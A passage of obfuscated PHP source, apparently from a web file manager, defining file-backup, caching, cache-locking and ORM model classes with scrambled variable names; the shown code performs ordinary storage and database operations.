$äéõÍùĞ) { return !0; } cacheLockWait(); } while (microtime(!0) < $Ñ°ş¯Íè); $this->unlock($Ñ´ÏºÔ); return !1; } public function lockGet($íÛÚşë×) { $Ş±Ş÷„¡ =& $_SERVER[¤øïŠ‹²]; $“À÷Ûó = rtrim(self::$cachePath, $Ş±Ş÷„¡[8]) . $Ş±Ş÷„¡[977] . md5($íÛÚşë×) . $Ş±Ş÷„¡[974]; return file_exists($“À÷Ûó); } public function unlock($ùÑìÔã°) { $›Ù›ëï =& $_SERVER[¤øïŠ‹²]; $õÀñ‹¡ = self::$caches[$ùÑìÔã°]; if (!$õÀñ‹¡) { return; } @flock($õÀñ‹¡[$›Ù›ëï[979]], LOCK_UN); @fclose($õÀñ‹¡[$›Ù›ëï[979]]); @unlink($õÀñ‹¡[$›Ù›ëï[243]]); unset(self::$caches[$ùÑìÔã°]); } } goto c ÙÉÂó; D¦ÉÂÜ‰: class BackupFile { public function __construct() { } public function index() { $îûçöŒ = Backup::get(); $ª½Ûé€ƒ = $îûçöŒ[$_SERVER[¤øïŠ‹²][857]][$_SERVER[¤øïŠ‹²][243]][$_SERVER[¤øïŠ‹²][563]]; $ÕŠ¬Õ¶ö = array($_SERVER[¤øïŠ‹²][564] => array($_SERVER[¤øïŠ‹²][916], $ª½Ûé€ƒ), $_SERVER[¤øïŠ‹²][917] => array($_SERVER[¤øïŠ‹²][418], $îûçöŒ[$_SERVER[¤øïŠ‹²][853]])); $™ÄƒšÂ = (int) Model($_SERVER[¤øïŠ‹²][895])->where($ÕŠ¬Õ¶ö)->count($_SERVER[¤øïŠ‹²][563]); $Ë­± Ûà = (int) Model($_SERVER[¤øïŠ‹²][895])->where($ÕŠ¬Õ¶ö)->sum($_SERVER[¤øïŠ‹²][90]); $ş¡ˆ˜ó = new TaskFileTransfer($_SERVER[¤øïŠ‹²][918], $_SERVER[¤øïŠ‹²][881], $™ÄƒšÂ, LNG($_SERVER[¤øïŠ‹²][890]) . $_SERVER[¤øïŠ‹²][891] . LNG($_SERVER[¤øïŠ‹²][919])); $ş¡ˆ˜ó->task[$_SERVER[¤øïŠ‹²][865]] = $Ë­± Ûà; $¾ø„äü = array($_SERVER[¤øïŠ‹²][920] => $™ÄƒšÂ, $_SERVER[¤øïŠ‹²][921] => $Ë­± Ûà, $_SERVER[¤øïŠ‹²][922] => time()); Backup::set($¾ø„äü); $åÜ±™« = !0; $’åÃÒ¬» = $this->storeIds(); $™ŒÇóœÒ = 1; $ÌİÂæï÷ = 1000; $¦áÌ—æİ = $Œ˜…åÛ‰ = 0; $úËüÚ¶ = array(); $ÈšËÓ‚Î = $÷Ş±İ³Ñ = 0; do { $’íî®†« = $_SERVER[¤øïŠ‹²][923]; $©ãøË·Õ = Model($_SERVER[¤øïŠ‹²][895])->where($ÕŠ¬Õ¶ö)->field($’íî®†«)->order($_SERVER[¤øïŠ‹²][924])->selectPage($ÌİÂæï÷, $™ŒÇóœÒ); $’ãáş¶Ö = !empty($©ãøË·Õ[$_SERVER[¤øïŠ‹²][457]]) ? $©ãøË·Õ[$_SERVER[¤øïŠ‹²][457]] : array(); foreach ($’ãáş¶Ö as $°Šáæ®) { if (!$this->_fileExist($°Šáæ®, $úËüÚ¶, $’åÃÒ¬»)) { Backup::log($_SERVER[¤øïŠ‹²][925] . $°Šáæ®[$_SERVER[¤øïŠ‹²][563]] . $_SERVER[¤øïŠ‹²][926] . $°Šáæ®[$_SERVER[¤øïŠ‹²][98]]); continue; } $‚¢™¹ñ = $°Šáæ®[$_SERVER[¤øïŠ‹²][98]]; $Ôıı– Ã = "\173\x69\x6f\72{$îûçöŒ[$_SERVER[¤øïŠ‹²][853]]}\x7d" . substr($‚¢™¹ñ, strlen("\x7b\x69\157\72{$°Šáæ®[$_SERVER[¤øïŠ‹²][927]]}\x7d")); if (IO::exist($Ôıı– Ã)) { $ş¡ˆ˜ó->updateFileEnd($°Šáæ®[$_SERVER[¤øïŠ‹²][32]], $°Šáæ®[$_SERVER[¤øïŠ‹²][90]]); } else { $Ôıı– Ã = get_path_father($Ôıı– Ã); IO::mkdir($Ôıı– Ã); if (!IO::copy($‚¢™¹ñ, $Ôıı– Ã, $_SERVER[¤øïŠ‹²][928])) { Backup::log($_SERVER[¤øïŠ‹²][929] . $‚¢™¹ñ . $_SERVER[¤øïŠ‹²][913] . $Ôıı– Ã . $_SERVER[¤øïŠ‹²][188]); $åÜ±™« = !1; break; } } $ª½Ûé€ƒ = $°Šáæ®[$_SERVER[¤øïŠ‹²][563]]; $Œ˜…åÛ‰ += 1; $¦áÌ—æİ += $°Šáæ®[$_SERVER[¤øïŠ‹²][90]]; $÷Ş±İ³Ñ += 1; $ÈšËÓ‚Î += $°Šáæ®[$_SERVER[¤øïŠ‹²][90]]; if ($¦áÌ—æİ >= 1024 * 1024 * 100) { $¾ø„äü = array($_SERVER[¤øïŠ‹²][852] => $ª½Ûé€ƒ, $_SERVER[¤øïŠ‹²][930] => $÷Ş±İ³Ñ, $_SERVER[¤øïŠ‹²][931] => $ÈšËÓ‚Î); Backup::set($¾ø„äü); $¦áÌ—æİ = $Œ˜…åÛ‰ = 0; } } $±í‘µˆË = count($’ãáş¶Ö); $™ŒÇóœÒ++; } while ($±í‘µˆË == $ÌİÂæï÷); $ş¡ˆ˜ó->end(); $¾ø„äü = array($_SERVER[¤øïŠ‹²][932] => 1, $_SERVER[¤øïŠ‹²][863] => time(), $_SERVER[¤øïŠ‹²][879] => 1, $_SERVER[¤øïŠ‹²][852] => $ª½Ûé€ƒ, $_SERVER[¤øïŠ‹²][933] => time()); if ($Œ˜…åÛ‰) { $¾ø„äü[$_SERVER[¤øïŠ‹²][930]] = $÷Ş±İ³Ñ; $¾ø„äü[$_SERVER[¤øïŠ‹²][931]] = $ÈšËÓ‚Î; } Backup::set($¾ø„äü); return !0; } private function _fileExist($çŠúıÁÜ, &$ı‰™„â, $ã÷‹»¿) { $‹ìå­£à =& $_SERVER[¤øïŠ‹²]; $À¶øù’¤ = $çŠúıÁÜ[$‹ìå­£à[98]]; if (in_array($çŠúıÁÜ[$‹ìå­£à[563]], $ı‰™„â)) { return !1; } if (!in_array($çŠúıÁÜ[$‹ìå­£à[927]], $ã÷‹»¿)) { return !1; } if (IO::exist($À¶øù’¤)) { return !0; } $Á¦…’ = get_path_father($À¶øù’¤); if (IO::exist($Á¦…’)) { $ı‰™„â[] = $çŠúıÁÜ[$‹ìå­£à[563]]; return !1; } $êÖé˜¬ç = array($‹ìå­£à[927] => $çŠúıÁÜ[$‹ìå­£à[927]], $‹ìå­£à[98] => array($‹ìå­£à[480], "{$Á¦…’}\45")); $²Ÿ³¢™¤ = Model($‹ìå­£à[895])->where($êÖé˜¬ç)->field($‹ìå­£à[564])->select(); $ı‰™„â = array_merge($ı‰™„â, array_to_keyvalue($²Ÿ³¢™¤, $‹ìå­£à[12], $‹ìå­£à[563])); return !1; } private function _fileFilter($¾•õŞ³) { $¤¡Ş„ğŒ =& $_SERVER[¤øïŠ‹²]; return; if (empty($¾•õŞ³)) { return; } $¿ ÖØ‡ = array($¤¡Ş„ğŒ[563] => array($¤¡Ş„ğŒ[7], array_unique($¾•õŞ³))); $™¾½ƒÅÆ = Model($¤¡Ş„ğŒ[934])->where($¿ ÖØ‡)->field($¤¡Ş„ğŒ[204])->select(); foreach ($™¾½ƒÅÆ as $ìÁ£„›Ì) { Model($¤¡Ş„ğŒ[934])->remove($ìÁ£„›Ì[$¤¡Ş„ğŒ[204]], !1); } } private function storeIds() { $õß¿ =& $_SERVER[¤øïŠ‹²]; $šÄè”²” = Model($õß¿[869])->listData(); $¥ñÁæ«Ó = array(); $óüÄ„¥ = $GLOBALS[$õß¿[6]][$õß¿[103]][$õß¿[935]]; foreach ($šÄè”²” as $ùş™¬æÉ) { $¿òÏ’§€ = strtolower($ùş™¬æÉ[$õß¿[107]]); if (!isset($óüÄ„¥[$¿òÏ’§€])) { continue; } $‹Û™Ü—À = $õß¿[88] . (isset($óüÄ„¥[$¿òÏ’§€]) ? $óüÄ„¥[$¿òÏ’§€] : ucfirst($¿òÏ’§€)); if (!class_exists($‹Û™Ü—À)) { continue; } $¥ñÁæ«Ó[] = $ùş™¬æÉ[$õß¿[493]]; } return $¥ñÁæ«Ó; } } class Cache { protected static $handle; protected static $memoryCache; protected static $runTimeCache; public static function init() { $¨ø´‚ş =& $_SERVER[¤øïŠ‹²]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); self::$runTimeCache = array(); $²º’ µ• = $GLOBALS[$¨ø´‚ş[6]][$¨ø´‚ş[436]]; $Á–›¨íì = $²º’ µ•[$²º’ µ•[$¨ø´‚ş[936]]]; $¾Ö“¹»÷ = $²º’ µ•[$¨ø´‚ş[937]]; switch ($²º’ µ•[$¨ø´‚ş[936]]) { case $¨ø´‚ş[21]: self::$handle = Model($¨ø´‚ş[938]); break; case $¨ø´‚ş[939]: self::$handle = new CacheRedis($Á–›¨íì, $¾Ö“¹»÷); break; case $¨ø´‚ş[940]: self::$handle = new CacheMemcached($Á–›¨íì, $¾Ö“¹»÷); break; case $¨ø´‚ş[243]: self::$handle = new CacheFile($Á–›¨íì, $¾Ö“¹»÷); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($µÛã¸ˆ) { if (is_array($µÛã¸ˆ) || is_object($µÛã¸ˆ)) { $µÛã¸ˆ = json_encode($µÛã¸ˆ); } $µÛã¸ˆ = rawurlencode($µÛã¸ˆ); return md5(KOD_SITE_ID . $_SERVER[¤øïŠ‹²][11] . $µÛã¸ˆ); } public static function get($éñ, $İû€©÷  = false) { $¯Îûúù = self::key($éñ); $¼¼êâ ± = self::init(); if ($İû€©÷ ) { return unserialize($¼¼êâ ±->get($¯Îûúù)); } if (!isset(self::$memoryCache[$¯Îûúù])) { $Øš‡òö‡ = $¼¼êâ ±->get($¯Îûúù); self::$memoryCache[$¯Îûúù] = unserialize($Øš‡òö‡); } return self::$memoryCache[$¯Îûúù]; } public static function set($«—Œİ£Ÿ, $ßûÙ˜™, $Â”¦å³˜ = false) { $ñ¬ù¿¶Ó =& $_SERVER[¤øïŠ‹²]; $ßÏš„× = self::key($«—Œİ£Ÿ); if (isset(self::$memoryCache[$ßÏš„×]) && self::$memoryCache[$ßÏš„×] === $ßûÙ˜™) { return !0; } if ($Â”¦å³˜ === 0) { self::$memoryCache[$ßÏš„×] = $ßûÙ˜™; return !0; } $İ¿•‘İà = self::init(); $º±°´ê = serialize($ßûÙ˜™); CacheLock::lock($«—Œİ£Ÿ . $ñ¬ù¿¶Ó[941]); $É²—ÕÒ¹ = $İ¿•‘İà->set($ßÏš„×, $º±°´ê, $Â”¦å³˜); self::$memoryCache[$ßÏš„×] = $ßûÙ˜™; CacheLock::unlock($«—Œİ£Ÿ . $ñ¬ù¿¶Ó[941]); return $É²—ÕÒ¹; } public static function getCall($‘ƒ²ÆÍÉ, $†ûÃÚ¶¶, $ÂñªÍ®¾, $Â¨•ñ‘Í = array()) { $Ú®ª“„­ =& $_SERVER[¤øïŠ‹²]; $‹ÉĞĞîç = self::get($‘ƒ²ÆÍÉ); if ($‹ÉĞĞîç || $‹ÉĞĞîç === $Ú®ª“„­[12]) { return $‹ÉĞĞîç; } $‹ÉĞĞîç = call_user_func_array($ÂñªÍ®¾, $Â¨•ñ‘Í); $‹ÉĞĞîç = $‹ÉĞĞîç ? $‹ÉĞĞîç : $Ú®ª“„­[12]; self::set($‘ƒ²ÆÍÉ, $‹ÉĞĞîç, $†ûÃÚ¶¶); return $‹ÉĞĞîç; } public static function limitCall($¯Œçâñ, $ß¥Öç€É = 15, $¬³‹¬•× = 30, $Ì®¨ÎÎö = true) { $÷Ÿéß“ =& $_SERVER[¤øïŠ‹²]; static $‘°„°¡ß = array(); if ($Ì®¨ÎÎö) { $¯Œçâñ = $¯Œçâñ . $÷Ÿéß“[942] . KodUser::id() . $÷Ÿéß“[943] . get_client_ip(); } if (isset($‘°„°¡ß[$¯Œçâñ]) && is_array($‘°„°¡ß[$¯Œçâñ])) { return $‘°„°¡ß[$¯Œçâñ][$÷Ÿéß“[344]] <= $¬³‹¬•×; } $Éôî’€è = self::get($¯Œçâñ); if (!is_array($Éôî’€è) || time() - $Éôî’€è[$÷Ÿéß“[217]] > $ß¥Öç€É) { $Éôî’€è = array($÷Ÿéß“[217] => time(), $÷Ÿéß“[344] => 0); } $Éôî’€è[$÷Ÿéß“[344]]++; self::set($¯Œçâñ, $Éôî’€è, $ß¥Öç€É); $‘°„°¡ß[$¯Œçâñ] = $Éôî’€è; return $Éôî’€è[$÷Ÿéß“[344]] <= $¬³‹¬•×; } public static function limitRuntime($¸ó”ôÉ, $í×ĞÖä) { $—¢££÷ = $_SERVER[¤øïŠ‹²][944] . $¸ó”ôÉ; if (isset(self::$runTimeCache[$—¢££÷]) || !$í×ĞÖä) { return !0; } $‹¯Ê¨˜ = intval(self::get($—¢££÷)); $‹¯Ê¨˜ = !$‹¯Ê¨˜ || $‹¯Ê¨˜ <= 0 ? 1 : $‹¯Ê¨˜ + 1; if ($‹¯Ê¨˜ > $í×ĞÖä) { return !1; } self::$runTimeCache[$—¢££÷] = !0; self::set($—¢££÷, $‹¯Ê¨˜, 3600); return !0; } public static function limitRuntimeClear() { if (!self::$runTimeCache) { return; } foreach (self::$runTimeCache as $¤»­Í“Ñ => $¨ãóÌ¯) { $²¡Îİ÷Ê = intval(self::get($¤»­Í“Ñ)); $²¡Îİ÷Ê = !$²¡Îİ÷Ê || $²¡Îİ÷Ê <= 1 ? 0 : $²¡Îİ÷Ê - 1; self::set($¤»­Í“Ñ, $²¡Îİ÷Ê, 3600); } self::$runTimeCache = array(); } public static function remove($Á·âØ¨§) { $Ø„®²ù = self::key($Á·âØ¨§); unset(self::$memoryCache[$Ø„®²ù]); self::clearTimeout(); CacheLock::lock($Á·âØ¨§); $Á¡æçÍî = self::init()->remove($Ø„®²ù); CacheLock::unlock($Á·âØ¨§); return $Á¡æçÍî; } public static function removeMemory($”¡Àú) { $ãºıø©‚ = self::key($”¡Àú); unset(self::$memoryCache[$ãºıø©‚]); } public static function clearMemory($ŒŠûšºÉ = false) { if ($ŒŠûšºÉ) { $ŒŠûšºÉ = self::key($ŒŠûšºÉ); unset(self::$memoryCache[$ŒŠûšºÉ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[¤øïŠ‹²][945])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[¤øïŠ‹²][946])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($¼ğÒˆ‘, $üÀä¬Ç±) { $ìî•À®š =& $_SERVER[¤øïŠ‹²]; $this->cachePath = $¼ğÒˆ‘[$ìî•À®š[98]]; $this->prefix = $ìî•À®š[947]; $this->cacheTime = $üÀä¬Ç±; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($å²˜’åô) { $øàªß =& $_SERVER[¤øïŠ‹²]; $å²˜’åô = str_replace(array($øàªß[948], $øàªß[109], $øàªß[87]), $øàªß[949], $å²˜’åô); return $this->cachePath . $øàªß[950] . $å²˜’åô . $øàªß[951]; } public function set($ÈÌÊîÊª, $ŞĞäóÇØ, $¹ô´Ô¤ = false) { $¹ô´Ô¤ = $¹ô´Ô¤ ? $¹ô´Ô¤ : $this->cacheTime; $œ±»ƒ­ò = $this->getFile($ÈÌÊîÊª); if (file_put_contents($œ±»ƒ­ò, $this->prefix . $ŞĞäóÇØ, LOCK_EX)) { @touch($œ±»ƒ­ò, intval(time() + $¹ô´Ô¤)); clearstatcache(); return !0; } @unlink($œ±»ƒ­ò); return !1; } public function get($ôì©öÀ×) { $•é…Õ÷ê = $this->getFile($ôì©öÀ×); if (file_exists($•é…Õ÷ê) && filemtime($•é…Õ÷ê) < time()) { @unlink($•é…Õ÷ê); return !1; } $ßÜËÈ²Å = @file_get_contents($•é…Õ÷ê); return substr($ßÜËÈ²Å, strlen($this->prefix)); } public function remove($ñ˜Ô’ôã) { $ƒ—È˜© = $this->getFile($ñ˜Ô’ôã); return @unlink($ƒ—È˜©); } public function deleteAll() { $Œñ¢¯ÉÑ =& $_SERVER[¤øïŠ‹²]; $åÛ®˜¨š = scandir($this->cachePath); foreach ($åÛ®˜¨š as $Ò³”®ƒÛ) { $ÂÍøÎ´Ø = $this->cachePath . $Ò³”®ƒÛ; if (strpos($ÂÍøÎ´Ø, $Œñ¢¯ÉÑ[951]) && strpos($ÂÍøÎ´Ø, $Œñ¢¯ÉÑ[952])) { @unlink($ÂÍøÎ´Ø); } } } public function clearTimeout() { $ŞÒçßÍ‰ =& $_SERVER[¤øïŠ‹²]; $èŒ—Ö‡ = scandir($this->cachePath); foreach ($èŒ—Ö‡ as $³€Î¼÷è) { $¤êÑì”õ = $this->cachePath . $³€Î¼÷è; if (strpos($¤êÑì”õ, $ŞÒçßÍ‰[951]) && strpos($¤êÑì”õ, $ŞÒçßÍ‰[952]) && filemtime($¤êÑì”õ) < time()) { @unlink($¤êÑì”õ); } } } } goto d›ê·çÍ«‰; bÆŞ¶‹ÌÄ: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\x62\154\145", "\x6f\x72\x64\x65\x72", "\x61\154\151\x61\x73", "\x68\x61\x76\151\x6e\x67", "\x67\162\157\x75\x70", "\x6c\x6f\143\153", "\x64\151\x73\x74\x69\x6e\x63\164", "\141\x75\164\157", "\146\151\x6c\x74\x65\162", "\x76\141\154\151\144\141\164\x65", "\x72\145\x73\165\154\x74", "\142\151\156\144", "\x74\x6f\x6b\145\x6e"); public function __construct($ïÜú¨Ú‘ = '', $»Ø²§˜ = '', $šÕ©öÙì = '') { $ÒÈëøæñ =& $_SERVER[¤øïŠ‹²]; $this->_initialize(); if (!empty($ïÜú¨Ú‘)) { if (strpos($ïÜú¨Ú‘, $ÒÈëøæñ[10])) { list($this->dbName, $this->name) = explode($ÒÈëøæñ[10], $ïÜú¨Ú‘); } else { $this->name = $ïÜú¨Ú‘; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($»Ø²§˜)) { $this->tablePrefix = $ÒÈëøæñ[12]; } elseif ($ÒÈëøæñ[12] != $»Ø²§˜) { $this->tablePrefix = $»Ø²§˜; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($ÒÈëøæñ[333]); } $this->db(0, empty($this->connection) ? $šÕ©öÙì : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $¡³ßì’â =& $_SERVER[¤øïŠ‹²]; if (empty($this->fields)) { if (think_config($¡³ßì’â[334])) { $»½—Çü = $this->dbName ? $this->dbName : think_config($¡³ßì’â[335]); $ÁÙ¸ó“½ = think_var_cache($¡³ßì’â[336] . strtolower(get_path_this($»½—Çü) . $¡³ßì’â[10] . $this->name)); if ($ÁÙ¸ó“½) { $Ëø½·¯â = think_config($¡³ßì’â[337]); if (empty($Ëø½·¯â) || $ÁÙ¸ó“½[$¡³ßì’â[338]] == $Ëø½·¯â) { $this->fields = $ÁÙ¸ó“½; return; } } } $this->flush(); } } public function flush() { $ÜûÛÈ™Ü =& $_SERVER[¤øïŠ‹²]; $this->db->setModel($this->name); $£™áÜ¶ = $this->db->getFields($this->getTableName()); if (!$£™áÜ¶) { return !1; } $this->fields = array_keys($£™áÜ¶); $this->fields[$ÜûÛÈ™Ü[339]] = !1; foreach ($£™áÜ¶ as $ÉÚ¤ãİÆ => $´…Óèß©) { $€æ«‚İä[$ÉÚ¤ãİÆ] = $´…Óèß©[$ÜûÛÈ™Ü[33]]; if ($´…Óèß©[$ÜûÛÈ™Ü[39]]) { $this->fields[$ÜûÛÈ™Ü[340]] = $ÉÚ¤ãİÆ; if ($´…Óèß©[$ÜûÛÈ™Ü[42]]) { $this->fields[$ÜûÛÈ™Ü[339]] = !0; } } } $this->fields[$ÜûÛÈ™Ü[341]] = $€æ«‚İä; if (think_config($ÜûÛÈ™Ü[337])) { $this->fields[$ÜûÛÈ™Ü[338]] = think_config($ÜûÛÈ™Ü[337]); } if (think_config($ÜûÛÈ™Ü[334])) { $øï®æÊÅ = $this->dbName ? $this->dbName : think_config($ÜûÛÈ™Ü[335]); think_var_cache($ÜûÛÈ™Ü[336] . strtolower(get_path_this($øï®æÊÅ) . $ÜûÛÈ™Ü[10] . $this->name), $this->fields); } } public function switchModel($èÊæÇğÜ, $ç•ˆèˆÕ = array()) { $µõæéø½ =& $_SERVER[¤øïŠ‹²]; $¿ü¸şºö = ucwords(strtolower($èÊæÇğÜ)) . $µõæéø½[342]; if (!class_exists($¿ü¸şºö)) { think_exception($¿ü¸şºö . think_lang($µõæéø½[343])); } $this->_extModel = new $¿ü¸şºö($this->name); if (!empty($ç•ˆèˆÕ)) { foreach ($ç•ˆèˆÕ as $İùæˆú) { $this->_extModel->setProperty($İùæˆú, $this->{$İùæˆú}); } } return $this->_extModel; } public function __set($¶úşì÷, $‹îƒÈö·) { $this->data[$¶úşì÷] = $‹îƒÈö·; } public function __get($£ß´¨¢ø) { return isset($this->data[$£ß´¨¢ø]) ? $this->data[$£ß´¨¢ø] : null; } public function __isset($ñÅ¬èîà) { return isset($this->data[$ñÅ¬èîà]); } public function __unset($›±¶²ù·) { unset($this->data[$›±¶²ù·]); } public function __call($’˜™¬Î‰, $­¯ì”ä) { $ÕÎÄ¼¿ü =& $_SERVER[¤øïŠ‹²]; if (in_array(strtolower($’˜™¬Î‰), $this->methods, !0)) { $this->options[strtolower($’˜™¬Î‰)] = $­¯ì”ä[0]; return $this; } elseif (in_array(strtolower($’˜™¬Î‰), array($ÕÎÄ¼¿ü[344], $ÕÎÄ¼¿ü[345], $ÕÎÄ¼¿ü[346], $ÕÎÄ¼¿ü[347], $ÕÎÄ¼¿ü[348]), !0)) { $£Õø·šÏ = isset($­¯ì”ä[0]) ? $­¯ì”ä[0] : $ÕÎÄ¼¿ü[233]; $£Õø·šÏ = $this->db->parseKey($£Õø·šÏ); return $this->getField(strtoupper($’˜™¬Î‰) . $ÕÎÄ¼¿ü[349] . $£Õø·šÏ . $ÕÎÄ¼¿ü[350] . $’˜™¬Î‰, $ÕÎÄ¼¿ü[344]); } elseif (strtolower(substr($’˜™¬Î‰, 0, 5)) == $ÕÎÄ¼¿ü[351]) { $£Õø·šÏ = think_parse_name(substr($’˜™¬Î‰, 5)); $Ïõ¢‰êÂ[$£Õø·šÏ] = $­¯ì”ä[0]; return $this->where($Ïõ¢‰êÂ)->find(); } elseif (strtolower(substr($’˜™¬Î‰, 0, 10)) == $ÕÎÄ¼¿ü[352]) { $ÊÚŒ£ê  = think_parse_name(substr($’˜™¬Î‰, 10)); $Ïõ¢‰êÂ[$ÊÚŒ£ê ] = $­¯ì”ä[0]; return $this->where($Ïõ¢‰êÂ)->getField($­¯ì”ä[1]); } elseif (isset($this->_scope[$’˜™¬Î‰])) { return $this->scope($’˜™¬Î‰, $­¯ì”ä[0]); } elseif (method_exists($this, $’˜™¬Î‰) || method_exists($this, $ÕÎÄ¼¿ü[353] . $’˜™¬Î‰)) { array_unshift($­¯ì”ä, $’˜™¬Î‰); return call_user_func_array(array($this, $ÕÎÄ¼¿ü[354]), $­¯ì”ä); } else { return call_user_func_array(array(parent, $’˜™¬Î‰), $­¯ì”ä); } } protected function call() { $›ıš =& $_SERVER[¤øïŠ‹²]; $ıÀÊ·¯¯ = func_get_args(); $†·ê‡×½ = array_shift($ıÀÊ·¯¯); $¤İôƒŸà = $†·ê‡×½; if (is_array($†·ê‡×½)) { $¤İôƒŸà = $†·ê‡×½[1]; $†·ê‡×½ = $†·ê‡×½[0]; } $Åİ›ç¢° = count($ıÀÊ·¯¯) - 1; if (isset($ıÀÊ·¯¯[$Åİ›ç¢°]) && $ıÀÊ·¯¯[$Åİ›ç¢°] === $†·ê‡×½) { think_exception(__CLASS__ . $›ıš[4] . $†·ê‡×½ . think_lang($›ıš[355])); return; } $ıÀÊ·¯¯[] = $†·ê‡×½; if (method_exists($this, $›ıš[356])) { $Ğ›ã×„ê = call_user_func_array(array($this, $›ıš[357]), array($¤İôƒŸà, $ıÀÊ·¯¯)); if (!is_null($Ğ›ã×„ê) && $Ğ›ã×„ê !== !1) { return $Ğ›ã×„ê; } } $İçé¥«ä = !1; if (method_exists($this, $†·ê‡×½)) { $İçé¥«ä = call_user_func_array(array($this, $†·ê‡×½), $ıÀÊ·¯¯); } if (method_exists($this, $›ıš[358])) { $Ğ›ã×„ê = call_user_func_array(array($this, $›ıš[359]), array($¤İôƒŸà, $ıÀÊ·¯¯, $İçé¥«ä)); if ($Ğ›ã×„ê) { return $Ğ›ã×„ê; } } return $İçé¥«ä; } protected function _initialize() { } protected function _facade($Ãƒñ) { $ÃõÚœ =& $_SERVER[¤øïŠ‹²]; if (!empty($this->fields)) { foreach ($Ãƒñ as $—ûÁÌëŒ => $‘Ùå‘Æ®) { if (is_array($this->fields) && !in_array($—ûÁÌëŒ, $this->fields, !0)) { unset($Ãƒñ[$—ûÁÌëŒ]); } elseif (is_scalar($‘Ùå‘Æ®)) { $this->_parseType($Ãƒñ, $—ûÁÌëŒ); } } } if (!empty($this->options[$ÃõÚœ[360]])) { $Ãƒñ = array_map($this->options[$ÃõÚœ[360]], $Ãƒñ); unset($this->options[$ÃõÚœ[360]]); } $this->_beforeWrite($Ãƒñ); return $Ãƒñ; } protected function _beforeWrite(&$ÆÓÃ»ÉÓ) { } public function add($ì‡ÂöÑ‚ = '', $ÙîÙ÷ì‡ = array(), $û‰•„ãš = false) { if (empty($ì‡ÂöÑ‚)) { if (!empty($this->data)) { $ì‡ÂöÑ‚ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[¤øïŠ‹²][361]); return !1; } } $ÙîÙ÷ì‡ = $this->_parseOptions($ÙîÙ÷ì‡); $ì‡ÂöÑ‚ = $this->_facade($ì‡ÂöÑ‚); if (!1 === $this->_beforeInsert($ì‡ÂöÑ‚, $ÙîÙ÷ì‡)) { return !1; } $‚Š™Òè¨ = $this->db->insert($ì‡ÂöÑ‚, $ÙîÙ÷ì‡, $û‰•„ãš); if (!1 !== $‚Š™Òè¨) { $ñ°å±º = $this->getLastInsID(); if ($ñ°å±º) { $ì‡ÂöÑ‚[$this->getPk()] = $ñ°å±º; $this->_after_insert($ì‡ÂöÑ‚, $ÙîÙ÷ì‡); return $ñ°å±º; } $this->_after_insert($ì‡ÂöÑ‚, $ÙîÙ÷ì‡); } return $‚Š™Òè¨; } protected function _beforeInsert(&$ß½ùÛ–Ö, $ÁĞİ¬ù£) { } protected function _after_insert($”Ï½Àİ, $â„ü¤ÚË) { } public function addAll($ÜŸêÇï‡, $õ‡°»¢¶ = array(), $ÔÄÏ­¥Í = false) { $Ñ±Ş‘ü =& $_SERVER[¤øïŠ‹²]; if (empty($ÜŸêÇï‡)) { $this->error = think_lang($Ñ±Ş‘ü[361]); return !1; } $õ‡°»¢¶ = $this->_parseOptions($õ‡°»¢¶); foreach ($ÜŸêÇï‡ as $¾–ùƒÙ¼ => $æ–ÇÃÅ£) { $ÜŸêÇï‡[$¾–ùƒÙ¼] = $this->_facade($æ–ÇÃÅ£); } if (method_exists($this->db, $Ñ±Ş‘ü[362])) { $ùÒäÖ¥ş = $this->db->insertAll($ÜŸêÇï‡, $õ‡°»¢¶, $ÔÄÏ­¥Í); } else { $this->startTrans(); foreach ($ÜŸêÇï‡ as $¾–ùƒÙ¼ => $æ–ÇÃÅ£) { $ùÒäÖ¥ş = $this->db->insert($æ–ÇÃÅ£, $õ‡°»¢¶, $ÔÄÏ­¥Í); } $this->commit(); } if (!1 !== $ùÒäÖ¥ş) { $ÏßßÆª = $this->getLastInsID(); if ($ÏßßÆª) { return $ÏßßÆª; } } return $ùÒäÖ¥ş; } public function selectAdd($ş“²Şı = '', $–¿’´° = '', $£»€‹‰è = array()) { $ùÆĞ•åè =& $_SERVER[¤øïŠ‹²]; $£»€‹‰è = $this->_parseOptions($£»€‹‰è); if (!1 === ($ å²¨ıø = $this->db->selectInsert($ş“²Şı ? $ş“²Şı : $£»€‹‰è[$ùÆĞ•åè[363]], $–¿’´° ? $–¿’´° : $this->getTableName(), $£»€‹‰è))) { $this->error = think_lang($ùÆĞ•åè[364]); return !1; } else { return $ å²¨ıø; } } public function save($Çş­±¸Ø = '', $ó¥íëææ = array()) { $“ÇèÊŞÎ =& $_SERVER[¤øïŠ‹²]; if (empty($Çş­±¸Ø)) { if (!empty($this->data)) { $Çş­±¸Ø = $this->data; $this->data = array(); } else { $this->error = think_lang($“ÇèÊŞÎ[361]); return !1; } } $Çş­±¸Ø = $this->_facade($Çş­±¸Ø); $ó¥íëææ = $this->_parseOptions($ó¥íëææ); $âÂ®¥üÉ = $this->getPk(); if (!isset($ó¥íëææ[$“ÇèÊŞÎ[365]])) { if (isset($Çş­±¸Ø[$âÂ®¥üÉ])) { $Øë·ïäù[$âÂ®¥üÉ] = $Çş­±¸Ø[$âÂ®¥üÉ]; $ó¥íëææ[$“ÇèÊŞÎ[365]] = $Øë·ïäù; unset($Çş­±¸Ø[$âÂ®¥üÉ]); } else { $this->error = think_lang($“ÇèÊŞÎ[364]); return !1; } } if 